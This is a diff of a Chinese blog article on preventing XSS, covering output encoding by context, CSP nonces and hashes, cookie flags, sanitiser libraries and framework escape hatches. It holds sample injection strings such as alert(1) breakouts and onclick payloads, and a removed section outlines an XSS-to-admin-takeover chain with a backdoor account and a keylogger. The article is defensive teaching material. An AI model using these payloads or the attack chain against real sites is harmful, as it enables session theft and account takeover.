-<li>CSP Level 2：引入 <code>nonce-xxx</code> 和 <code>sha256-xxx</code>，精确控制可执行的脚本</li>
-<li>CSP Level 3：引入 <code>strict-dynamic</code>，由受信任脚本动态加载的子脚本自动获得信任</li>
-</ul>
-<p>推荐做法：使用 <code>nonce</code> 机制，每次请求生成随机 nonce，内联脚本必须携带匹配的 nonce 才能执行：</p>
-<pre><code>Content-Security-Policy: script-src &#39;nonce-rAnd0mV4lu3&#39;
-</code></pre>
-<pre><code class="html">&lt;script nonce=&quot;rAnd0mV4lu3&quot;&gt;
-  // 只有携带正确 nonce 的脚本才能执行
-  console.log(&#39;safe&#39;);
+<p><strong>场景三：数据插入 JavaScript 代码块</strong></p>
+<pre><code class="html">&lt;script&gt;
+  var name = &quot;用户输入在这里&quot;;
 &lt;/script&gt;
 </code></pre>
-<h4 id="4-3-HttpOnly-Cookie"><a href="#4-3-HttpOnly-Cookie" class="headerlink" title="4.3 HttpOnly Cookie"></a>4.3 HttpOnly Cookie</h4><p>给敏感 Cookie 设置 <code>HttpOnly</code> 标志，阻止 JavaScript 通过 <code>document.cookie</code> 访问：</p>
-<pre><code>Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
+<p>这里需要编码的是 JS 字符串的元字符：<code>&quot;</code>、<code>&#39;</code>、<code>\</code>、换行符、以及 <code>&lt;/script&gt;</code> 序列（浏览器遇到这个序列就会闭合 script 标签，不管它在 JS 字符串内部）。</p>
+<pre><code class="java">String safe = Encode.forJavaScript(userInput);
+// 输入: &quot;; alert(1); //
+// 输出: \x22; alert(1); //
+// 双引号被编码为 \x22，不会闭合字符串字面量
 </code></pre>
-<p><code>HttpOnly</code> 阻止 JS 读取 Cookie，<code>Secure</code> 要求 HTTPS 传输，<code>SameSite=Strict</code> 阻止跨站请求携带 Cookie（防御 CSRF 的同时也降低了 XSS 窃取 Cookie 的价值）。</p>
-<p>注意：<code>HttpOnly</code> 只保护 Cookie，不保护 localStorage 和 sessionStorage 中的数据。如果应用将 token 存在 localStorage 中，XSS 仍然可以通过 <code>localStorage.getItem(&#39;token&#39;)</code> 窃取。</p>
-<h4 id="4-4-输入验证"><a href="#4-4-输入验证" class="headerlink" title="4.4 输入验证"></a>4.4 输入验证</h4><p>输入验证是辅助手段，不能替代输出编码，但能减少攻击面：</p>
-<pre><code class="python"># 白名单验证：只允许预期字符
-import re
+<pre><code class="python"># Python: 将 JSON 嵌入 HTML 时的安全做法
+# 错误：
+# &lt;script&gt;var data = &#123;&#123; user_data | safe &#125;&#125;;&lt;/script&gt;
+# 正确：
+# &lt;script&gt;var data = &#123;&#123; user_data | tojson &#125;&#125;;&lt;/script&gt;
+# tojson 会编码 &lt; &gt; &amp; 等字符为 \uXXXX 形式
+</code></pre>
+<p><strong>场景四：数据插入 URL 参数</strong></p>
+<pre><code class="html">&lt;a href=&quot;/search?q=用户输入&quot;&gt;搜索&lt;/a&gt;
+</code></pre>
+<p>需要 URL 编码，防止用户输入 <code>&quot;</code> 闭合属性或 <code>javascript:</code> 改变协议：</p>
+<pre><code class="java">String safe = Encode.forUriComponent(userInput);
+// 输入: &quot; onclick=alert(1)
+// 输出: %22%20onclick%3Dalert%281%29
+</code></pre>
+<p><strong>核心原则总结：</strong> 数据在哪个位置使用，就用那个位置的编码函数。混用等于没防。</p>
+<h4 id="3-2-Content-Security-Policy（CSP）：浏览器层面的兜底"><a href="#3-2-Content-Security-Policy（CSP）：浏览器层面的兜底" class="headerlink" title="3.2 Content Security Policy（CSP）：浏览器层面的兜底"></a>3.2 Content Security Policy（CSP）：浏览器层面的兜底</h4><p>即使输出编码做对了，CSP 仍然是必要的——它提供了最后一道防线。</p>
+<p>CSP 通过 HTTP 响应头告诉浏览器：只允许加载和执行来自特定来源的脚本。</p>
+<p><strong>基础配置：</strong></p>
+<pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;; object-src &#39;none&#39;
+</code></pre>
+<p>含义：默认只允许同源资源；脚本只允许同源；禁止 <code>&lt;object&gt;</code>/<code>&lt;embed&gt;</code>。</p>
+<p>这条配置下，即使存在 XSS 注入点，攻击者注入的 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 是内联脚本，而 CSP 默认禁止所有内联脚本执行（包括 <code>&lt;script&gt;</code> 标签内容和 <code>onclick</code> 等事件属性）。</p>
+<p><strong>为什么禁止内联脚本就能挡住大部分攻击？</strong> 因为大多数 XSS payload 都是内联的——要么是一段 <code>&lt;script&gt;</code> 代码，要么是 <code>onerror</code> 事件属性。CSP 禁止内联脚本后，这些 payload 全部失效。</p>
+<p><strong>但攻击者可能加载外部脚本：</strong> 如果 CSP 没有严格限制 <code>script-src</code>，攻击者可能从允许的域加载脚本。所以 <code>script-src &#39;self&#39;</code> 意味着只允许同源脚本，外部域的脚本也会被拦截。</p>
+<p><strong>nonce 机制（推荐）：</strong> 对于必须使用内联脚本的场景，用 nonce 精确控制：</p>
+<pre><code>Content-Security-Policy: script-src &#39;nonce-rAnd0mV4lu3&#39;
+</code></pre>
+<pre><code class="html">&lt;!-- 只有携带正确 nonce 的脚本才能执行 --&gt;
+&lt;script nonce=&quot;rAnd0mV4lu3&quot;&gt;
+  console.log(&#39;safe&#39;);
+&lt;/script&gt;
 
+&lt;!-- 攻击者注入的脚本没有 nonce，被拦截 --&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>每次 HTTP 请求生成新的随机 nonce，攻击者无法预测，所以注入的脚本无法通过 CSP 校验。</p>
+<p><strong>hash 机制：</strong> 对于内容固定的内联脚本，可以用 hash 代替 nonce：</p>
+<pre><code>Content-Security-Policy: script-src &#39;sha256-xxxBase64Hash&#39;
+</code></pre>
+<pre><code class="html">&lt;script&gt;console.log(&#39;fixed content&#39;)&lt;/script&gt;
+</code></pre>
+<p>浏览器计算脚本内容的 SHA-256，与 CSP 头中的 hash 比对，匹配才执行。</p>
+<p><strong>CSP 部署建议：</strong> 先用 <code>Content-Security-Policy-Report-Only</code> 模式部署，观察报告日志中哪些合法脚本被误拦截，调整策略后再切换到 enforcement 模式（<code>Content-Security-Policy</code>）。避免直接上线导致页面功能异常。</p>
+<h4 id="3-3-HttpOnly-Cookie：让-XSS-偷不到会话"><a href="#3-3-HttpOnly-Cookie：让-XSS-偷不到会话" class="headerlink" title="3.3 HttpOnly Cookie：让 XSS 偷不到会话"></a>3.3 HttpOnly Cookie：让 XSS 偷不到会话</h4><pre><code>Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
+</code></pre>
+<p><code>HttpOnly</code> 阻止 JavaScript 通过 <code>document.cookie</code> 读取 Cookie。浏览器仍然会在 HTTP 请求中自动携带这个 Cookie，但 JS 代码看不到它。</p>
+<pre><code class="javascript">document.cookie  // 返回 &quot;&quot;（空字符串），HttpOnly 的 Cookie 不在其中
+</code></pre>
+<p><strong>三个标志各自的作用：</strong></p>
+<p><code>HttpOnly</code>：阻止 JS 读取。防御 XSS 窃取 Cookie。</p>
+<p><code>Secure</code>：只通过 HTTPS 传输。防止中间人抓包拿到 Cookie。</p>
+<p><code>SameSite=Strict</code>：跨站请求不携带。防御 CSRF（攻击者在自己的页面上发起请求时，浏览器不会带上目标站的 Cookie）。<code>Lax</code> 是较宽松的版本，允许顶级导航（如用户点击链接跳转）携带 Cookie，但阻止 AJAX 和表单跨站提交。</p>
+<p><strong>局限性：</strong> HttpOnly 只保护 Cookie。如果应用将 token 存在 localStorage 中，XSS 仍然可以通过 <code>localStorage.getItem(&#39;token&#39;)</code> 窃取。所以敏感数据不要存在 localStorage 中，优先使用 HttpOnly Cookie。</p>
+<h4 id="3-4-输入验证：在入口处收窄攻击面"><a href="#3-4-输入验证：在入口处收窄攻击面" class="headerlink" title="3.4 输入验证：在入口处收窄攻击面"></a>3.4 输入验证：在入口处收窄攻击面</h4><p>输入验证不能替代输出编码，但它能在数据进入系统时就拦截明显恶意的内容，减少后续每个处理环节的风险。</p>
+<p><strong>白名单优于黑名单。</strong> 黑名单永远有遗漏（攻击者总能找到你没列出的变体），白名单只允许已知安全的输入。</p>
+<pre><code class="python">import re
+
+# 用户名：只允许字母数字下划线，3-20 位
 def validate_username(username):
     if not re.match(r&#39;^[a-zA-Z0-9_]&#123;3,20&#125;$&#39;, username):
         raise ValueError(&quot;Invalid username&quot;)
     return username
 
-# 对于邮箱、URL 等有明确格式的数据，使用标准库验证
+# 年龄：只允许数字
+def validate_age(age_str):
+    age = int(age_str)
+    if age &lt; 0 or age &gt; 150:
+        raise ValueError(&quot;Invalid age&quot;)
+    return age
+
+# 邮箱：使用标准库验证
 from email.utils import parseaddr
-name, addr = parseaddr(user_input)
-if not addr or &#39;@&#39; not in addr:
-    raise ValueError(&quot;Invalid email&quot;)
+def validate_email(raw):
+    name, addr = parseaddr(raw)
+    if not addr or &#39;@&#39; not in addr:
+        raise ValueError(&quot;Invalid email&quot;)
+    return addr
 </code></pre>
-<p>输入验证的价值在于：在数据进入系统时就拦截明显恶意的内容，减少后续处理链路中的风险。但它不能覆盖所有 XSS 场景（合法输入中也可能包含需要编码的字符），所以必须配合输出编码。</p>
-<h4 id="4-5-使用安全的模板引擎"><a href="#4-5-使用安全的模板引擎" class="headerlink" title="4.5 使用安全的模板引擎"></a>4.5 使用安全的模板引擎</h4><p>现代模板引擎默认对变量做 HTML 转义，大幅降低了 XSS 风险：</p>
-<pre><code class="jinja2">&#123;# Jinja2 (Python/Flask)：默认转义 #&#125;
+<p><strong>对于富文本输入，白名单验证不适用</strong>（用户确实需要提交 HTML），这时需要专门的 HTML 清洗（见 3.6）。</p>
+<p><strong>输入验证的正确定位：</strong> 它是纵深防御的一层，用于拦截格式明显错误的输入。但它不能覆盖所有 XSS 场景——合法输入中也可能包含需要编码的字符（比如用户名字符串中恰好包含 <code>&lt;</code>），所以必须配合输出编码。</p>
+<h4 id="3-5-模板引擎与框架的默认防护"><a href="#3-5-模板引擎与框架的默认防护" class="headerlink" title="3.5 模板引擎与框架的默认防护"></a>3.5 模板引擎与框架的默认防护</h4><p>现代模板引擎默认对变量做 HTML 转义，大幅降低了 XSS 风险。理解它们的默认行为和”逃生舱”是安全使用的前提。</p>
+<p><strong>默认安全的：</strong></p>
+<pre><code class="jinja2">&#123;# Jinja2 (Flask)：&#123;&#123; &#125;&#125; 自动转义 #&#125;
 &lt;p&gt;&#123;&#123; user_input &#125;&#125;&lt;/p&gt;
-&#123;# user_input 中的 < > & 等字符会被自动转义 #&#125;
-</code></pre>
-<pre><code class="ejs">&lt;!-- EJS (Node.js)：使用 &lt;%= %&gt; 自动转义 --&gt;
-&lt;p&gt;&lt;%= userInput %&gt;&lt;/p&gt;
-</code></pre>
-<pre><code class="thymeleaf">&lt;!-- Thymeleaf (Java/Spring)：默认转义 --&gt;
+
+&#123;# Django：&#123;&#123; &#125;&#125; 自动转义 #&#125;
+&lt;p&gt;&#123;&#123; user_input &#125;&#125;&lt;/p&gt;
+
+&#123;# Thymeleaf (Spring)：th:text 自动转义 #&#125;
 &lt;p th:text=&quot;$&#123;userInput&#125;&quot;&gt;&lt;/p&gt;
-</code></pre>
-<p><strong>危险操作：</strong> 使用”原始输出”标签会跳过转义，必须确保数据已经过清洗：</p>
-<pre><code class="jinja2">&#123;# Jinja2：|safe 过滤器跳过转义，危险！ #&#125;
-&lt;p&gt;&#123;&#123; user_input | safe &#125;&#125;&lt;/p&gt;
 
-&#123;# Django：|safe 过滤器同理 #&#125;
-&lt;p&gt;&#123;&#123; user_input | safe &#125;&#125;&lt;/p&gt;
-</code></pre>
-<h4 id="4-6-框架内置防护"><a href="#4-6-框架内置防护" class="headerlink" title="4.6 框架内置防护"></a>4.6 框架内置防护</h4><p>主流前端框架默认对插值做转义：</p>
-<pre><code class="jsx">// React：默认转义 JSX 中的变量
+&#123;# EJS (Node.js)：<%= %> 自动转义 #&#125;
+&lt;p&gt;&lt;%= userInput %&gt;&lt;/p&gt;
+
+&#123;# React：&#123;&#125; 自动转义 #&#125;
 &lt;div&gt;&#123;userInput&#125;&lt;/div&gt;
-// userInput 中的 &lt;script&gt; 会被转义为 &amp;lt;script&amp;gt;
 
-// 危险操作：dangerouslySetInnerHTML 绕过转义
+&#123;# Vue：&#123;&#123; &#125;&#125; 自动转义 #&#125;
+&lt;p&gt;&#123;&#123; userInput &#125;&#125;&lt;/p&gt;
+</%=></code></pre>
+<p><strong>危险的逃生舱（跳过转义）：</strong></p>
+<pre><code class="jinja2">&#123;# Jinja2：|safe 跳过转义 #&#125;
+&lt;p&gt;&#123;&#123; user_input | safe &#125;&#125;&lt;/p&gt;
+
+&#123;# Django：|safe 跳过转义 #&#125;
+&lt;p&gt;&#123;&#123; user_input | safe &#125;&#125;&lt;/p&gt;
+
+&#123;# React：dangerouslySetInnerHTML 跳过转义 #&#125;
 &lt;div dangerouslySetInnerHTML=&#123;&#123;__html: userInput&#125;&#125; /&gt;
-</code></pre>
-<pre><code class="vue">&lt;!-- Vue：&#123;&#123; &#125;&#125; 默认转义 --&gt;
-&lt;p&gt;&#123;&#123; userInput &#125;&#125;&lt;/p&gt;
 
-&lt;!-- 危险操作：v-html 绕过转义 --&gt;
+&#123;# Vue：v-html 跳过转义 #&#125;
 &lt;p v-html=&quot;userInput&quot;&gt;&lt;/p&gt;
-</code></pre>
-<pre><code class="angular">&lt;!-- Angular：[] 绑定默认转义 --&gt;
-&lt;p&gt;&#123;&#123; userInput &#125;&#125;&lt;/p&gt;
 
-&lt;!-- 危险操作：bypassSecurityTrustHtml 绕过转义 --&gt;
-&lt;div [innerHTML]=&quot;sanitizedHtml&quot;&gt;&lt;/div&gt;
+&#123;# Angular：bypassSecurityTrustHtml 跳过转义 #&#125;
+&lt;div [innerHTML]=&quot;userInput&quot;&gt;&lt;/div&gt;
 </code></pre>
-<p>这些框架的默认行为是安全的，但开发者使用 <code>dangerouslySetInnerHTML</code>、<code>v-html</code>、<code>bypassSecurityTrustHtml</code> 等”逃生舱”时会主动放弃防护。</p>
-<h4 id="4-7-富文本场景的特殊处理"><a href="#4-7-富文本场景的特殊处理" class="headerlink" title="4.7 富文本场景的特殊处理"></a>4.7 富文本场景的特殊处理</h4><p>富文本编辑器允许用户提交 HTML，不能简单做全量转义。需要专门的 HTML 清洗：</p>
-<pre><code class="javascript">// 使用 DOMPurify（推荐）
+<p>使用这些逃生舱时，开发者必须确保数据已经过清洗或来自可信来源。如果数据来自用户输入，直接使用逃生舱等于主动放弃防护。</p>
+<p><strong>JSP 的特殊情况：</strong> <code>&lt;%= variable %&gt;</code> 不会自动转义。需要手动调用 <code>StringEscapeUtils</code> 或配置 <code>&lt;%@ page escapeXml=&quot;true&quot; %&gt;</code>。很多老项目使用 JSP，这是 XSS 的高发区。</p>
+<h4 id="3-6-富文本清洗：当用户确实需要提交-HTML"><a href="#3-6-富文本清洗：当用户确实需要提交-HTML" class="headerlink" title="3.6 富文本清洗：当用户确实需要提交 HTML"></a>3.6 富文本清洗：当用户确实需要提交 HTML</h4><p>论坛、博客、CMS 等场景允许用户提交 HTML 格式的内容，不能简单做全量转义（否则加粗、链接等格式全部丢失）。需要专门的 HTML 清洗库，只保留安全标签和属性。</p>
+<pre><code class="javascript">// JavaScript: DOMPurify（最推荐的前端清洗库）
 import DOMPurify from &#39;dompurify&#39;;
+
 const clean = DOMPurify.sanitize(dirtyHtml, &#123;
-  ALLOWED_TAGS: [&#39;p&#39;, &#39;b&#39;, &#39;i&#39;, &#39;em&#39;, &#39;strong&#39;, &#39;a&#39;, &#39;img&#39;, &#39;ul&#39;, &#39;ol&#39;, &#39;li&#39;],
+  ALLOWED_TAGS: [&#39;p&#39;, &#39;b&#39;, &#39;i&#39;, &#39;em&#39;, &#39;strong&#39;, &#39;a&#39;, &#39;img&#39;, &#39;ul&#39;, &#39;ol&#39;, &#39;li&#39;, &#39;blockquote&#39;, &#39;code&#39;, &#39;pre&#39;],
   ALLOWED_ATTR: [&#39;href&#39;, &#39;src&#39;, &#39;alt&#39;, &#39;title&#39;, &#39;target&#39;],
-  ALLOW_DATA_ATTR: false
+  ALLOW_DATA_ATTR: false,       // 禁止 data-* 属性
+  ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i  // 禁止 javascript: 协议
 &#125;);
 </code></pre>
-<pre><code class="python"># Python: 使用 bleach
+<pre><code class="python"># Python: bleach
 import bleach
 
-clean = bleach.clean(dirty_html,
-    tags=[&#39;p&#39;, &#39;b&#39;, &#39;i&#39;, &#39;em&#39;, &#39;strong&#39;, &#39;a&#39;, &#39;img&#39;],
-    attributes=&#123;&#39;a&#39;: [&#39;href&#39;, &#39;title&#39;], &#39;img&#39;: [&#39;src&#39;, &#39;alt&#39;]&#125;,
-    strip=True
+clean = bleach.clean(
+    dirty_html,
+    tags=[&#39;p&#39;, &#39;b&#39;, &#39;i&#39;, &#39;em&#39;, &#39;strong&#39;, &#39;a&#39;, &#39;img&#39;, &#39;ul&#39;, &#39;ol&#39;, &#39;li&#39;],
+    attributes=&#123;
+        &#39;a&#39;: [&#39;href&#39;, &#39;title&#39;, &#39;target&#39;],
+        &#39;img&#39;: [&#39;src&#39;, &#39;alt&#39;, &#39;title&#39;]
+    &#125;,
+    protocols=&#123;&#39;href&#39;: [&#39;http&#39;, &#39;https&#39;, &#39;mailto&#39;]&#125;,  # 禁止 javascript: 协议
+    strip=True  # 移除不安全的标签（而非转义）
 )
 </code></pre>
-<pre><code class="java">// Java: 使用 OWASP Java HTML Sanitizer
+<pre><code class="java">// Java: OWASP Java HTML Sanitizer
 PolicyFactory policy = new HtmlPolicyBuilder()
-    .allowElements(&quot;p&quot;, &quot;b&quot;, &quot;i&quot;, &quot;em&quot;, &quot;strong&quot;, &quot;a&quot;, &quot;img&quot;)
+    .allowElements(&quot;p&quot;, &quot;b&quot;, &quot;i&quot;, &quot;em&quot;, &quot;strong&quot;, &quot;a&quot;, &quot;img&quot;, &quot;ul&quot;, &quot;ol&quot;, &quot;li&quot;)
     .allowAttributes(&quot;href&quot;).onElements(&quot;a&quot;)
     .allowAttributes(&quot;src&quot;, &quot;alt&quot;).onElements(&quot;img&quot;)
-    .allowUrlProtocols(&quot;https&quot;)
+    .allowUrlProtocols(&quot;https&quot;, &quot;http&quot;, &quot;mailto&quot;)  // 禁止 javascript:
+    .allowAttributes(&quot;target&quot;).matching(true, &quot;_blank&quot;).onElements(&quot;a&quot;)  // target 只允许 _blank
     .toFactory();
+
 String safeHtml = policy.sanitize(dirtyHtml);
 </code></pre>
-<p>关键配置要点：禁止 <code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;object&gt;</code>、<code>&lt;embed&gt;</code> 标签；禁止 <code>on*</code> 事件属性；禁止 <code>javascript:</code> 协议的 URL；禁止 <code>&lt;style&gt;</code> 标签（CSS 也可用于攻击）。</p>
-<hr>
-<h3 id="五、各语言-框架常见陷阱"><a href="#五、各语言-框架常见陷阱" class="headerlink" title="五、各语言/框架常见陷阱"></a>五、各语言/框架常见陷阱</h3><h4 id="5-1-Java"><a href="#5-1-Java" class="headerlink" title="5.1 Java"></a>5.1 Java</h4><ul>
-<li><code>JSP</code> 的 <code>&lt;%= variable %&gt;</code> 不会自动转义（除非配置 <code>escapeXml</code>）</li>
-<li>Spring MVC 的 <code>@ResponseBody</code> 返回 JSON 时，如果 Content-Type 设置错误（如 <code>text/html</code>），JSON 中的用户数据可能被浏览器当 HTML 解析</li>
-<li><code>StringEscapeUtils.escapeHtml()</code> 在旧版 Commons Lang 中不处理所有 Unicode 字符</li>
-</ul>
-<h4 id="5-2-PHP"><a href="#5-2-PHP" class="headerlink" title="5.2 PHP"></a>5.2 PHP</h4><ul>
-<li><code>echo $userInput</code> 不做任何转义，是 XSS 最常见的根源</li>
-<li><code>htmlspecialchars()</code> 必须指定 <code>ENT_QUOTES</code> 和字符编码，否则单引号和特殊编码可能绕过</li>
-<li><code>$_SERVER[&#39;PHP_SELF&#39;]</code> 包含 URL 路径，如果直接用于 <code>form action</code> 属性，路径部分可被注入</li>
-</ul>
-<pre><code class="php">&lt;!-- 危险：PHP_SELF 可被注入 --&gt;
-&lt;form action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]; ?&gt;&quot;&gt;
-
-&lt;!-- 如果访问 /page.php/&lt;script&gt;alert(1)&lt;/script&gt; --&gt;
-&lt;!-- 渲染为 --&gt;
-&lt;form action=&quot;/page.php/&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
+<p><strong>必须禁止的内容：</strong></p>
+<p><code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;object&gt;</code>、<code>&lt;embed&gt;</code>、<code>&lt;applet&gt;</code>、<code>&lt;form&gt;</code> 标签——这些标签天然具有代码执行或页面嵌套能力。</p>
+<p>所有 <code>on*</code> 事件属性（<code>onerror</code>、<code>onload</code>、<code>onclick</code> 等）——这是 XSS 注入的主要载体。</p>
+<p><code>javascript:</code> 协议的 URL——在 <code>href</code>、<code>src</code>、<code>style</code> 等属性中，<code>javascript:</code> 可以直接执行代码。</p>
+<p><code>&lt;style&gt;</code> 标签和 <code>style</code> 属性中的 <code>expression()</code>、<code>url()</code>——IE 低版本中 CSS 也可执行代码，现代浏览器中 <code>url()</code> 仍可能触发 SSRF。</p>
+<h4 id="3-7-安全响应头"><a href="#3-7-安全响应头" class="headerlink" title="3.7 安全响应头"></a>3.7 安全响应头</h4><p>除了 CSP，还有几个响应头能降低 XSS 风险：</p>
+<pre><code>X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+X-Frame-Options: DENY
 </code></pre>
-<h4 id="5-3-Python"><a href="#5-3-Python" class="headerlink" title="5.3 Python"></a>5.3 Python</h4><ul>
-<li>Flask 的 <code>render_template_string</code> 如果使用 <code>&#123;&#123; variable | safe &#125;&#125;</code> 会跳过转义</li>
-<li>Django 的 <code>mark_safe()</code> 和 <code>|safe</code> 过滤器同理</li>
-<li><code>json.dumps()</code> 默认不转义 <code>&lt;</code> <code>&gt;</code> <code>&amp;</code>，如果 JSON 被嵌入 HTML 页面，可能被 XSS 利用</li>
-</ul>
-<pre><code class="python"># 危险：JSON 嵌入 HTML
-&lt;script&gt;
-  var data = &#123;&#123; user_data | safe &#125;&#125;;  # 如果 user_data 包含 &lt;/script&gt;，会闭合标签
-&lt;/script&gt;
-
-# 安全做法：使用 |tojson 过滤器（Flask 提供）
-&lt;script&gt;
-  var data = &#123;&#123; user_data | tojson &#125;&#125;;
-&lt;/script&gt;
-</code></pre>
-<h4 id="5-4-Node-js"><a href="#5-4-Node-js" class="headerlink" title="5.4 Node.js"></a>5.4 Node.js</h4><ul>
-<li>Express 的 <code>res.send(userInput)</code> 如果 Content-Type 是 <code>text/html</code>，直接输出未转义内容</li>
-<li><code>res.json()</code> 是安全的（Content-Type 为 <code>application/json</code>），但前端如果用 <code>innerHTML</code> 渲染 JSON 数据，仍然会触发 XSS</li>
-<li>EJS 的 <code>&lt;%- %&gt;</code> 不转义，<code>&lt;%= %&gt;</code> 转义，容易混淆</li>
-</ul>
+<p><code>nosniff</code> 阻止浏览器 MIME 嗅探。如果服务端返回一个 JSON 文件但 Content-Type 设置错误为 <code>text/html</code>，浏览器会把它当 HTML 解析，可能触发 XSS。<code>nosniff</code> 让浏览器严格按照服务端声明的 Content-Type 处理。</p>
+<p><code>X-XSS-Protection</code> 是旧版 IE/Chrome 的内置 XSS 过滤器，检测到反射型 XSS 时阻止页面渲染。现代浏览器已废弃此头（CSP 取代了它的功能），但为兼容旧浏览器仍建议设置。</p>
+<p><code>X-Frame-Options: DENY</code> 阻止页面被嵌入 <code>&lt;iframe&gt;</code>，防御点击劫持（Clickjacking）。攻击者无法再将你的页面嵌入恶意 iframe 中诱导用户操作。</p>
 <hr>
-<h3 id="六、完整防御清单"><a href="#六、完整防御清单" class="headerlink" title="六、完整防御清单"></a>六、完整防御清单</h3><p>按优先级排列：</p>
-<ol>
-<li>输出编码——根据插入上下文选择对应的编码函数（HTML/属性/JS/URL/CSS）</li>
-<li>使用默认转义的模板引擎或前端框架，避免使用”逃生舱”</li>
-<li>部署 CSP——禁止 <code>unsafe-inline</code>，使用 <code>nonce</code> 或 <code>hash</code> 机制</li>
-<li>富文本场景使用专业 HTML 清洗库（DOMPurify / bleach / OWASP Sanitizer）</li>
-<li>敏感 Cookie 设置 <code>HttpOnly</code> + <code>Secure</code> + <code>SameSite</code></li>
-<li>输入验证作为辅助——白名单校验格式固定的字段</li>
-<li>避免将用户数据放入 <code>innerHTML</code>、<code>document.write</code>、<code>eval</code> 等 sink</li>
-<li>对 JSON 嵌入 HTML 场景使用专用序列化（如 <code>|tojson</code>）</li>
-<li>定期使用自动化扫描工具（如 OWASP ZAP、Burp Suite）检测 XSS</li>
-<li>安全响应头：<code>X-Content-Type-Options: nosniff</code>、<code>X-XSS-Protection</code>（旧浏览器）</li>
-</ol>
+<h3 id="四、各语言常见陷阱"><a href="#四、各语言常见陷阱" class="headerlink" title="四、各语言常见陷阱"></a>四、各语言常见陷阱</h3><h4 id="4-1-Java"><a href="#4-1-Java" class="headerlink" title="4.1 Java"></a>4.1 Java</h4><p><code>JSP</code> 的 <code>&lt;%= variable %&gt;</code> 不自动转义，是老项目 XSS 的第一大来源。Spring MVC 的 <code>@ResponseBody</code> 返回 JSON 时，如果 Content-Type 被错误设置为 <code>text/html</code>，JSON 中的用户数据会被浏览器当 HTML 解析。<code>StringEscapeUtils.escapeHtml()</code> 在旧版 Commons Lang 中不处理所有 Unicode 控制字符。</p>
+<h4 id="4-2-PHP"><a href="#4-2-PHP" class="headerlink" title="4.2 PHP"></a>4.2 PHP</h4><p><code>echo $userInput</code> 不做任何转义，是最常见的 XSS 根源。<code>htmlspecialchars()</code> 必须指定 <code>ENT_QUOTES | ENT_HTML5</code> 和 <code>&#39;UTF-8&#39;</code>，否则单引号和特殊编码可能绕过。<code>$_SERVER[&#39;PHP_SELF&#39;]</code> 包含 URL 路径，直接用于 <code>form action</code> 属性时路径部分可被注入。</p>
+<h4 id="4-3-Python"><a href="#4-3-Python" class="headerlink" title="4.3 Python"></a>4.3 Python</h4><p>Flask 的 <code>render_template_string</code> 使用 <code>&#123;&#123; variable | safe &#125;&#125;</code> 会跳过转义。Django 的 <code>mark_safe()</code> 和 <code>|safe</code> 过滤器同理。<code>json.dumps()</code> 默认不转义 <code>&lt;</code> <code>&gt;</code> <code>&amp;</code>，JSON 嵌入 HTML 时需要用 <code>|tojson</code> 过滤器或手动设置 <code>ensure_ascii=True</code>。</p>
+<h4 id="4-4-Node-js"><a href="#4-4-Node-js" class="headerlink" title="4.4 Node.js"></a>4.4 Node.js</h4><p>Express 的 <code>res.send(userInput)</code> 如果 Content-Type 是 <code>text/html</code>，直接输出未转义内容。EJS 的 <code>&lt;%- %&gt;</code> 不转义、<code>&lt;%= %&gt;</code> 转义，容易混淆。前端如果用 <code>innerHTML</code> 渲染后端返回的 JSON 数据，即使后端是安全的，前端仍然会触发 XSS。</p>
 <hr>
-<h3 id="七、攻击链示例：从-XSS-到完全接管"><a href="#七、攻击链示例：从-XSS-到完全接管" class="headerlink" title="七、攻击链示例：从 XSS 到完全接管"></a>七、攻击链示例：从 XSS 到完全接管</h3><p>一个典型的完整攻击链：</p>
+<h3 id="五、防御优先级总结"><a href="#五、防御优先级总结" class="headerlink" title="五、防御优先级总结"></a>五、防御优先级总结</h3><p>按重要程度排列：</p>
 <ol>
-<li>发现评论区存在存储型 XSS → 输入 <code>&lt;img src=x onerror=...&gt;</code> 未被过滤</li>
-<li>脚本窃取管理员的 Cookie → 但 Cookie 设置了 <code>HttpOnly</code>，无法读取</li>
-<li>改为利用 XSS 发起 CSRF 请求 → 以管理员身份调用 <code>/api/admin/create-user</code> 创建后门账户</li>
-<li>或者：利用 XSS 注入键盘记录器 → 等待管理员在页面上输入敏感操作密码</li>
-<li>如果 CSP 阻止了内联脚本 → 寻找 JSONP 端点或 CORS 配置错误来加载外部脚本</li>
-<li>如果所有防御都到位 → 转向其他攻击面（SQL 注入、SSRF、文件上传等）</li>
+<li><strong>输出编码</strong>——根据数据插入的上下文（HTML/属性/JS/URL）选择对应编码函数，这是最根本的防御</li>
+<li><strong>使用默认转义的模板引擎</strong>——Jinja2、Django templates、Thymeleaf、React、Vue，默认都安全；避免使用 <code>|safe</code>、<code>v-html</code>、<code>dangerouslySetInnerHTML</code> 等逃生舱</li>
+<li><strong>CSP</strong>——部署 <code>script-src &#39;nonce-xxx&#39;</code> 策略，作为输出编码之外的兜底</li>
+<li><strong>富文本清洗</strong>——使用 DOMPurify / bleach / OWASP Sanitizer，白名单控制允许的标签和属性</li>
+<li><strong>HttpOnly + Secure + SameSite Cookie</strong>——让 XSS 即使存在也偷不到会话</li>
+<li><strong>输入验证</strong>——白名单校验格式固定的字段（用户名、邮箱、数字）</li>
+<li><strong>安全响应头</strong>——<code>nosniff</code>、<code>X-Frame-Options</code></li>
+<li><strong>避免危险 sink</strong>——不使用 <code>innerHTML</code>、<code>document.write</code>、<code>eval</code>，改用 <code>textContent</code>、<code>createElement</code></li>
 </ol>
-<p>这条攻击链说明：XSS 不仅仅是一个”弹个 alert”的漏洞，它是攻击者进入用户浏览器上下文的入口，后续的利用空间取决于攻击者的创造力和系统的纵深防御水平。</p>
 
                 
             </div>
